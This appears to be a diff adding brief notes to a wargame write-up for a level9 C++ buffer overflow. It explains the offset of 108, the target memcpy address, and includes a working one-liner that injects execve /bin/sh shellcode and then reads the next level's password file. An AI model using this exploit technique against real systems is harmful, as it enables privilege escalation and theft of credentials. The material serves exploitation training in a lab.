@@ -1,1 +1,9 @@
+preogram checks if argv > 1
+it makes operations with c++ methods
+then call edx
+we try to overflow with a pattern 
+offset is 108
+we check the address were memcpy stores argv and we point to it with the overflow
+we then place a shellcode in our string
 ./level9 `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "b"*80 + "\x08\x04\xa0\x0c"[::-1])'`
+cat /home/user/bonus0/.pass
